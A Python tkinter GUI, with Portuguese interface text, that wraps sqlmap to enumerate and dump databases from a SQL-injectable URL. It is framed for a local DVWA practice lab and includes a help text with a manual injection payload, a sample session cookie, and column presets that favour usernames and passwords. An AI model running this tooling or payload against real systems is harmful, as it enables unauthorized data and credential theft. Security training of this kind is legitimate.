#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL_Database.py - Interface gráfica para sqlmap com NAVEGADOR DE BANCO + SELEÇÃO
Uso autorizado apenas em laboratório/teste próprio (ex.: DVWA local)

- Nada executa sozinho: clique em "🔍 Iniciar"
- Navegação: banco -> tabelas -> colunas -> dump (com ◀ ▶ no histórico)
- Quadradinhos ☑ para marcar/desmarcar colunas antes do dump
- Resultados salvos na pasta do script (resultados_sqlmap/) — NUNCA no
  /root/.local/share/sqlmap/output/ — ou na pasta que você escolher
- Botão "❓ Ajuda" com o passo a passo completo

python3 SQL_Database.py
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import shutil
import os
import re

DIRETORIO_ATUAL = os.path.dirname(os.path.abspath(__file__))
PASTA_PADRAO = os.path.join(DIRETORIO_ATUAL, "resultados_sqlmap")

TEXTO_AJUDA = """
═══════════════════════════════════════════════════════════
   COMO USAR O SQL Database (passo a passo)
═══════════════════════════════════════════════════════════

PASSO 1 — Verificar o nível de segurança do DVWA
   Abra no navegador:
   http://192.168.0.10/dvwa/security.php
   → Deve mostrar: "Security Level is currently: low"
   → Se estiver em medium/high, mude para low.

PASSO 2 — Testar a injeção manualmente (opcional)
   Abra no navegador:
   http://192.168.0.10/dvwa/vulnerabilities/sqli/
   → No campo User ID, digite:  ' OR '1'='1
   → Se aparecer a tabela de usuários, a injeção funciona.

PASSO 3 — Pegar a URL completa para o campo "URL"
   http://192.168.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
   → Cole exatamente essa URL no campo "URL:" da interface.

PASSO 5 — Copiar o Cookie do navegador
   No navegador: clique com o botão direito → Inspecionar
   → Vá na aba: Armazenamento (Storage) → Cookies
   → Copie o Nome e o Valor dos cookies.

PASSO 4 — Preencher o campo "Cookie"
   Formato (cole assim, separado por ponto e vírgula):
   PHPSESSID=6d1023762f58fd6975a6a3b282d9efa0; security=low

   ⚠️ Se o cookie expirar (sqlmap dá erro de login),
      recarregue a página no navegador e copie um novo.

PASSO FINAL — Executar
   1. Clique em "🔍 Iniciar (Listar Bancos)"
   2. Duplo clique num banco   → mostra as tabelas
   3. Duplo clique numa tabela → mostra as colunas
   4. Marque ☑ as colunas que quiser (ex.: user + password)
   5. Clique em "⬇️ DUMP DAS COLUNAS SELECIONADAS"
   6. Use ◀ Voltar / Avançar ▶ para navegar entre os níveis

RESULTADOS
   Salvos na pasta:  resultados_sqlmap/  (dentro da pasta do script)
   Ou na pasta que você escolher em "📁 Pasta de saída".

EXECUTAR O SCRIPT
   python3 SQL_Database.py

REQUISITOS
   - sqlmap instalado (teste no terminal: sqlmap --version)
   - DVWA rodando e logado (cookie válido)
═══════════════════════════════════════════════════════════
"""


class SQLMapGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Database (Laboratório Autorizado)")
        self.root.geometry("1100x860")
        self.processo = None

        self.historico = []
        self.pos_hist = -1
        self.dados_extraidos = []

        self.col_vars = {}
        self.colunas_atuais = []
        self.db_atual = None
        self.tabela_atual = None

        self.criar_widgets()

    # ================================================================
    # WIDGETS
    # ================================================================
    def criar_widgets(self):
        frm_top = ttk.LabelFrame(self.root, text="Alvo")
        frm_top.pack(fill="x", padx=8, pady=5)

        ttk.Label(frm_top, text="URL:").grid(row=0, column=0, sticky="w", padx=5, pady=3)
        self.url = tk.StringVar(value="http://192.168.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")
        ttk.Entry(frm_top, textvariable=self.url, width=85).grid(row=0, column=1, padx=5, pady=3)

        ttk.Label(frm_top, text="Cookie:").grid(row=1, column=0, sticky="w", padx=5, pady=3)
        self.cookie = tk.StringVar(value="PHPSESSID=6d1023762f58fd6975a6a3b282d9efa0; security=low")
        ttk.Entry(frm_top, textvariable=self.cookie, width=85).grid(row=1, column=1, padx=5, pady=3)

        ttk.Label(frm_top, text="Level:").grid(row=2, column=0, sticky="w")
        self.level = tk.StringVar(value="1")
        ttk.Spinbox(frm_top, from_=1, to=5, textvariable=self.level, width=5).grid(row=2, column=1, sticky="w")
        ttk.Label(frm_top, text="Risk:").grid(row=2, column=1, sticky="e")
        self.risk = tk.StringVar(value="1")
        ttk.Spinbox(frm_top, from_=1, to=3, textvariable=self.risk, width=5).grid(row=2, column=1, sticky="w", padx=(60, 0))

        self.var_batch = tk.BooleanVar(value=True)
        ttk.Checkbutton(frm_top, text="--batch (sem perguntas)", variable=self.var_batch).grid(row=2, column=1, sticky="e", padx=10)

        # ===== Pasta de saída =====
        frm_pasta = ttk.LabelFrame(self.root, text="📁 Pasta de saída (onde o sqlmap salva os resultados)")
        frm_pasta.pack(fill="x", padx=8, pady=5)

        self.pasta = tk.StringVar(value=PASTA_PADRAO)
        ttk.Entry(frm_pasta, textvariable=self.pasta, width=85).pack(side="left", fill="x", expand=True, padx=5, pady=3)
        ttk.Button(frm_pasta, text="Escolher...", command=self.escolher_pasta).pack(side="left", padx=5)
        ttk.Button(frm_pasta, text="Abrir pasta", command=self.abrir_pasta).pack(side="left", padx=2)

        # --- Barra de navegação ---
        nav = ttk.LabelFrame(self.root, text="Navegação")
        nav.pack(fill="x", padx=8, pady=5)

        self.btn_voltar = ttk.Button(nav, text="◀ Voltar", command=self.voltar, state="disabled", width=12)
        self.btn_voltar.pack(side="left", padx=4, pady=4)
        self.btn_avancar = ttk.Button(nav, text="Avançar ▶", command=self.avancar, state="disabled", width=12)
        self.btn_avancar.pack(side="left", padx=4)

        self.btn_iniciar = ttk.Button(nav, text="🔍 Iniciar (Listar Bancos)",
                                      command=self.iniciar, width=22)
        self.btn_iniciar.pack(side="left", padx=8)

        self.lbl_local = tk.Label(nav, text="Você está em: — (clique em Iniciar)", anchor="w",
                                  bg="#222", fg="#0f0", font=("Consolas", 10))
        self.lbl_local.pack(side="left", fill="x", expand=True, padx=8, ipady=4)

        # ===== BOTÃO DE AJUDA =====
        ttk.Button(nav, text="❓ Ajuda", command=self.abrir_ajuda, width=10).pack(side="right", padx=6)

        # --- Explorador (esquerda) + Painel direito ---
        paned = ttk.PanedWindow(self.root, orient="horizontal")
        paned.pack(fill="both", expand=True, padx=8, pady=5)

        frm_tree = ttk.LabelFrame(paned, text="Explorer (duplo clique para entrar)")
        self.tree = ttk.Treeview(frm_tree, show="tree", height=15)
        sb = ttk.Scrollbar(frm_tree, command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side="left", fill="both", expand=True, padx=3, pady=3)
        sb.pack(side="right", fill="y")
        self.tree.bind("<Double-1>", self.on_duplo_clique)
        paned.add(frm_tree, weight=1)

        paned_r = ttk.PanedWindow(paned, orient="vertical")
        paned.add(paned_r, weight=2)

        # ===== Quadro de seleção com CHECKBOXES =====
        frm_sel = ttk.LabelFrame(paned_r, text="☑ Selecionar colunas (clique para marcar/desmarcar)")
        barra_sel = ttk.Frame(frm_sel)
        barra_sel.pack(fill="x", padx=3, pady=2)

        ttk.Button(barra_sel, text="Marcar todas", command=self.marcar_todas, width=14).pack(side="left", padx=2)
        ttk.Button(barra_sel, text="Desmarcar todas", command=self.desmarcar_todas, width=16).pack(side="left", padx=2)
        ttk.Button(barra_sel, text="Inverter seleção", command=self.inverter_selecao, width=15).pack(side="left", padx=2)

        self.lbl_contador = tk.Label(barra_sel, text="☑ 0 de 0 selecionadas",
                                     fg="#0f0", bg="#1a1a1a", font=("Consolas", 9))
        self.lbl_contador.pack(side="left", padx=10)

        self.btn_dump_sel = ttk.Button(barra_sel, text="⬇️ DUMP DAS COLUNAS SELECIONADAS",
                                       command=self.dump_selecionadas, state="disabled")
        self.btn_dump_sel.pack(side="left", padx=10)

        canvas = tk.Canvas(frm_sel, height=110, highlightthickness=0)
        sb_sel = ttk.Scrollbar(frm_sel, orient="vertical", command=canvas.yview)
        self.frame_checks = tk.Frame(canvas, bg="#1a1a1a")
        self.frame_checks.bind("<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=self.frame_checks, anchor="nw")
        canvas.configure(yscrollcommand=sb_sel.set)
        canvas.pack(side="left", fill="both", expand=True, padx=3, pady=3)
        sb_sel.pack(side="right", fill="y")
        paned_r.add(frm_sel, weight=0)

        # --- Painel de dados ---
        frm_data = ttk.LabelFrame(paned_r, text="Dados encontrados no nível atual")
        self.txt_dados = scrolledtext.ScrolledText(frm_data, width=60, height=12,
                                                   bg="#111", fg="#0f0", font=("Consolas", 9))
        self.txt_dados.pack(fill="both", expand=True, padx=3, pady=3)
        self.txt_dados.tag_config("destaque", foreground="#0ff")
        self.txt_dados.tag_config("secao", foreground="#ff0", font=("Consolas", 10, "bold"))
        paned_r.add(frm_data, weight=1)

        # --- Log ---
        frm_log = ttk.LabelFrame(self.root, text="Saída (Log do sqlmap)")
        frm_log.pack(fill="both", padx=8, pady=5)
        self.saida = scrolledtext.ScrolledText(frm_log, height=10, bg="#111", fg="#0f0",
                                               font=("Consolas", 8))
        self.saida.pack(fill="both", expand=True)

        # --- Ações ---
        acoes = ttk.Frame(self.root)
        acoes.pack(fill="x", padx=8, pady=5)
        ttk.Button(acoes, text="💾 Salvar Dados .TXT", command=self.salvar_txt).pack(side="left", padx=3)
        ttk.Button(acoes, text="❓ Ajuda", command=self.abrir_ajuda).pack(side="left", padx=3)
        ttk.Button(acoes, text="Parar sqlmap", command=self.parar).pack(side="right", padx=3)
        ttk.Button(acoes, text="Limpar Log", command=lambda: self.saida.delete("1.0", tk.END)).pack(side="right", padx=3)

    # ================================================================
    # JANELA DE AJUDA
    # ================================================================
    def abrir_ajuda(self):
        janela = tk.Toplevel(self.root)
        janela.title("❓ Ajuda - Como usar o SQL Database")
        janela.geometry("640x560")
        janela.transient(self.root)   # fica sempre sobre a janela principal
        janela.grab_set()             # bloqueia a principal até fechar

        barra = ttk.Frame(janela)
        barra.pack(fill="x", padx=5, pady=4)
        ttk.Button(barra, text="💾 Salvar ajuda em .TXT", command=self.salvar_ajuda).pack(side="left", padx=3)
        ttk.Button(barra, text="Fechar", command=janela.destroy).pack(side="right", padx=3)

        txt = scrolledtext.ScrolledText(janela, bg="#111", fg="#0f0",
                                        font=("Consolas", 10), wrap="word")
        txt.pack(fill="both", expand=True, padx=5, pady=5)
        txt.insert("1.0", TEXTO_AJUDA)
        txt.config(state="disabled")  # somente leitura

    def salvar_ajuda(self):
        arquivo = filedialog.asksaveasfilename(
            defaultextension=".txt", initialfile="ajuda_sql_database.txt",
            filetypes=[("Texto", "*.txt")])
        if arquivo:
            with open(arquivo, "w", encoding="utf-8") as f:
                f.write(TEXTO_AJUDA)
            self.log(f"[✓] Ajuda salva em: {arquivo}\n")

    # ================================================================
    # PASTA DE SAÍDA
    # ================================================================
    def escolher_pasta(self):
        pasta = filedialog.askdirectory(title="Escolha onde salvar os resultados")
        if pasta:
            self.pasta.set(pasta)

    def abrir_pasta(self):
        pasta = self.pasta.get().strip()
        if pasta and os.path.isdir(pasta):
            try:
                if os.name == "nt":
                    os.startfile(pasta)
                else:
                    subprocess.Popen(["xdg-open", pasta])
            except Exception as e:
                self.log(f"[!] Não foi possível abrir a pasta: {e}\n")

    def garantir_pasta(self):
        pasta = self.pasta.get().strip()
        if pasta:
            os.makedirs(pasta, exist_ok=True)
        return pasta

    # ================================================================
    # CHECKBOXES DE COLUNAS
    # ================================================================
    def limpar_checks(self):
        for w in self.frame_checks.winfo_children():
            w.destroy()
        self.col_vars = {}
        self.colunas_atuais = []
        self.btn_dump_sel.config(state="disabled")
        self.atualizar_contador()

    def criar_checks(self, colunas):
        self.limpar_checks()
        padrao_marcadas = {"user", "username", "usuario", "password", "senha",
                           "pass", "hash", "email"}
        for i, col in enumerate(colunas):
            nome = col.split(" ")[0]
            var = tk.BooleanVar(value=(nome.lower() in padrao_marcadas))
            cb = tk.Checkbutton(self.frame_checks, text=col, variable=var,
                                anchor="w", bg="#1a1a1a", fg="#e0e0e0",
                                activebackground="#1a1a1a", activeforeground="#0ff",
                                selectcolor="#333", font=("Consolas", 9))
            cb.grid(row=i // 4, column=i % 4, sticky="w", padx=6, pady=1)
            var.trace_add("write", lambda *a: self.atualizar_contador())
            self.col_vars[nome] = var
            self.colunas_atuais.append(nome)
        if colunas:
            self.btn_dump_sel.config(state="normal")
        self.atualizar_contador()

    def atualizar_contador(self):
        marcadas = len(self.colunas_marcadas())
        total = len(self.col_vars)
        self.lbl_contador.config(text=f"☑ {marcadas} de {total} selecionadas")

    def marcar_todas(self):
        for var in self.col_vars.values():
            var.set(True)

    def desmarcar_todas(self):
        for var in self.col_vars.values():
            var.set(False)

    def inverter_selecao(self):
        for var in self.col_vars.values():
            var.set(not var.get())

    def colunas_marcadas(self):
        return [nome for nome, var in self.col_vars.items() if var.get()]

    def dump_selecionadas(self):
        cols = self.colunas_marcadas()
        if not cols:
            messagebox.showinfo("Aviso", "Nenhuma coluna marcada ☑. Marque ao menos uma.")
            return
        db, tb = self.db_atual, self.tabela_atual
        if not db or not tb:
            messagebox.showinfo("Aviso", "Entre numa tabela primeiro (duplo clique).")
            return
        self.ir_para({"nivel": "data", "db": db, "table": tb, "dados": []})
        self.rodar_sqlmap(["-D", db, "-T", tb, "-C", ",".join(cols), "--dump"],
                          self.cb_dados, db=db, table=tb)

    # ================================================================
    # INÍCIO MANUAL
    # ================================================================
    def iniciar(self):
        self.btn_iniciar.config(state="disabled")
        self.ir_para({"nivel": "dbs", "db": None, "table": None, "dados": []})
        self.rodar_sqlmap(["--dbs"], self.cb_dbs)

    def reativar_inicio(self):
        self.btn_iniciar.config(state="normal")

    # ================================================================
    # NAVEGAÇÃO (HISTÓRICO)
    # ================================================================
    def ir_para(self, local):
        self.historico = self.historico[:self.pos_hist + 1]
        self.historico.append(local)
        self.pos_hist = len(self.historico) - 1
        self.renderizar(local)
        self.atualizar_botoes()

    def voltar(self):
        if self.pos_hist > 0:
            self.pos_hist -= 1
            self.renderizar(self.historico[self.pos_hist])
            self.atualizar_botoes()

    def avancar(self):
        if self.pos_hist < len(self.historico) - 1:
            self.pos_hist += 1
            self.renderizar(self.historico[self.pos_hist])
            self.atualizar_botoes()

    def atualizar_botoes(self):
        self.btn_voltar.config(state="normal" if self.pos_hist > 0 else "disabled")
        self.btn_avancar.config(state="normal" if self.pos_hist < len(self.historico) - 1 else "disabled")

    def nome_local(self, local):
        n = local["nivel"]
        if n == "dbs":
            return "Bancos de dados"
        if n == "tables":
            return f"Banco: {local['db']} → Tabelas"
        if n == "columns":
            return f"{local['db']}.{local['table']} → Colunas (marque ☑ e faça dump)"
        return f"Dados de {local['db']}.{local['table']}"

    # ================================================================
    # RENDERIZAÇÃO
    # ================================================================
    def renderizar(self, local):
        self.txt_dados.delete("1.0", tk.END)
        self.tree.delete(*self.tree.get_children())
        self.lbl_local.config(text=f"Você está em: {self.nome_local(local)}")

        self.db_atual = local.get("db")
        self.tabela_atual = local.get("table")

        nivel = local["nivel"]
        if nivel != "columns":
            self.limpar_checks()

        if nivel == "dbs":
            self.tree.insert("", "end", text="📁 Bancos de dados")
            for db in local["dados"]:
                self.tree.insert("", "end", text=f"🗄️ {db}", values=("db", db))
            self.mostrar_secao("BANCOS ENCONTRADOS", local["dados"])

        elif nivel == "tables":
            db = local["db"]
            self.tree.insert("", "end", text=f"🗄️ {db}", open=True)
            for tb in local["dados"]:
                self.tree.insert("", "end", text=f"    📋 {tb}", values=("table", db, tb))
            self.mostrar_secao(f"TABELAS DO BANCO '{db}'", local["dados"])

        elif nivel == "columns":
            db, tb = local["db"], local["table"]
            self.tree.insert("", "end", text=f"🗄️ {db}", open=True)
            self.tree.insert("", "end", text=f"    📋 {tb}", open=True, values=("table", db, tb))
            for col in local["dados"]:
                nome = col.split(" ")[0]
                self.tree.insert("", "end", text=f"        ☑ {col}", values=("column", db, tb, nome))
            self.criar_checks(local["dados"])
            self.mostrar_secao(f"COLUNAS DE {db}.{tb} (marque/desmarque ☑)", local["dados"])

        elif nivel == "data":
            db, tb = local["db"], local["table"]
            self.tree.insert("", "end", text=f"🗄️ {db}", open=True)
            self.tree.insert("", "end", text=f"    📋 {tb}", open=True, values=("table", db, tb))
            self.tree.insert("", "end", text="        ⬇️ [ DADOS ]", open=True)
            self.dados_extraidos = local["dados"]
            self.txt_dados.insert(tk.END, f"  DADOS DE {db}.{tb}\n", "secao")
            self.txt_dados.insert(tk.END, "=" * 50 + "\n")
            for item in local["dados"]:
                self.txt_dados.insert(tk.END, f"  {item}\n", "destaque")
            if not local["dados"]:
                self.txt_dados.insert(tk.END, "  (nada extraído — verifique o log)\n")

    def mostrar_secao(self, titulo, itens):
        self.txt_dados.insert(tk.END, f"  {titulo}\n", "secao")
        self.txt_dados.insert(tk.END, "=" * 50 + "\n")
        for it in itens:
            self.txt_dados.insert(tk.END, f"  • {it}\n", "destaque")
        if not itens:
            self.txt_dados.insert(tk.END, "  (nenhum item — veja o log abaixo)\n")

    # ================================================================
    # DUPLO CLIQUE
    # ================================================================
    def on_duplo_clique(self, event):
        item = self.tree.selection()
        if not item:
            return
        vals = self.tree.item(item[0])["values"]
        if not vals:
            return
        tipo = vals[0]

        if tipo == "db":
            db = vals[1]
            self.ir_para({"nivel": "tables", "db": db, "table": None, "dados": []})
            self.rodar_sqlmap(["-D", db, "--tables"], self.cb_tabelas, db=db)

        elif tipo == "table":
            db, tb = vals[1], vals[2]
            self.ir_para({"nivel": "columns", "db": db, "table": tb, "dados": []})
            self.rodar_sqlmap(["-D", db, "-T", tb, "--columns"], self.cb_colunas, db=db, table=tb)

        elif tipo == "column":
            db, tb, col = vals[1], vals[2], vals[3]
            self.ir_para({"nivel": "data", "db": db, "table": tb, "dados": []})
            self.rodar_sqlmap(["-D", db, "-T", tb, "-C", col, "--dump"], self.cb_dados, db=db, table=tb)

    # ================================================================
    # SQLMAP
    # ================================================================
    def montar_base(self):
        cmd = ["sqlmap", "-u", self.url.get(), "--cookie", self.cookie.get()]
        if self.var_batch.get():
            cmd.append("--batch")
        cmd += ["--level", self.level.get(), "--risk", self.risk.get()]
        pasta = self.garantir_pasta()
        if pasta:
            cmd += ["--output-dir", pasta]
        return cmd

    def rodar_sqlmap(self, extra, callback, **ctx):
        if shutil.which("sqlmap") is None:
            messagebox.showerror("Erro", "sqlmap não encontrado no PATH.")
            self.reativar_inicio()
            return
        self.garantir_pasta()
        cmd = self.montar_base() + extra
        self.log("\n[+] Executando: " + " ".join(cmd) + "\n")
        threading.Thread(target=self.rodar, args=(cmd, callback, ctx), daemon=True).start()

    def rodar(self, cmd, callback, ctx):
        try:
            self.processo = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                             stderr=subprocess.STDOUT, text=True, bufsize=1)
            saida_completa = []
            for linha in self.processo.stdout:
                saida_completa.append(linha)
                self.log(linha)
            self.processo.wait()
            self.log(f"\n[=] Finalizado (código {self.processo.returncode})\n")
            pasta = self.pasta.get().strip()
            if pasta:
                self.log(f"[i] Resultados salvos em: {pasta}\n")
            if self.processo.returncode == 0:
                texto = "".join(saida_completa)
                self.root.after(0, lambda: callback(texto, **ctx))
        except Exception as e:
            self.log(f"[!] Erro: {e}\n")
            self.root.after(0, self.reativar_inicio)

    # ---- Callbacks: parse da saída ----
    def cb_dbs(self, texto):
        bancos = re.findall(r"\[\*\]\s+(\S+)", texto)
        if not bancos:
            bancos = re.findall(r"^\|\s+([\w\-]+)\s+\|", texto, re.M)
        self.atualizar_local({"nivel": "dbs", "db": None, "table": None, "dados": sorted(set(bancos))})

    def cb_tabelas(self, texto, db):
        tabelas = re.findall(r"^\|\s+([\w$]+)\s+\|", texto, re.M)
        tabelas = [t for t in tabelas if t.lower() != "table"]
        self.atualizar_local({"nivel": "tables", "db": db, "table": None, "dados": sorted(set(tabelas))})

    def cb_colunas(self, texto, db, table):
        cols = re.findall(r"^\|\s+([\w$]+)\s+\|\s+([\w()]+)", texto, re.M)
        nomes = [f"{c} ({t})" for c, t in cols if c.lower() not in ("column", "field", "type")]
        self.atualizar_local({"nivel": "columns", "db": db, "table": table, "dados": nomes})

    def cb_dados(self, texto, db, table):
        linhas = []
        for m in re.finditer(r"^\|\s(.+?)\s\|$", texto, re.M):
            linha = m.group(1)
            if set(linha.strip()) <= {"-", "+", " "}:
                continue
            partes = [p.strip() for p in linha.split("|")]
            if partes and partes[0].lower() in ("user", "username", "password", "column", "field", "id"):
                continue
            linhas.append(" | ".join(partes))
        self.atualizar_local({"nivel": "data", "db": db, "table": table, "dados": linhas})

    def atualizar_local(self, novo_local):
        if 0 <= self.pos_hist < len(self.historico):
            self.historico[self.pos_hist] = novo_local
        self.renderizar(novo_local)
        self.atualizar_botoes()

    # ================================================================
    # EXPORTAÇÃO / UTIL
    # ================================================================
    def salvar_txt(self):
        conteudo = self.txt_dados.get("1.0", tk.END)
        if not conteudo.strip():
            messagebox.showinfo("Aviso", "Nada para salvar.")
            return
        pasta = self.garantir_pasta()
        arquivo = filedialog.asksaveasfilename(
            defaultextension=".txt", initialdir=pasta,
            initialfile="exploracao.txt", filetypes=[("Texto", "*.txt")])
        if arquivo:
            with open(arquivo, "w", encoding="utf-8") as f:
                f.write(conteudo)
            self.log(f"[✓] TXT salvo: {arquivo}\n")

    def parar(self):
        if self.processo and self.processo.poll() is None:
            self.processo.terminate()
            self.log("[!] Processo interrompido.\n")
            self.reativar_inicio()

    def log(self, texto):
        self.root.after(0, lambda: (self.saida.insert(tk.END, texto), self.saida.see(tk.END)))


if __name__ == "__main__":
    root = tk.Tk()
    app = SQLMapGUI(root)
    root.mainloop()
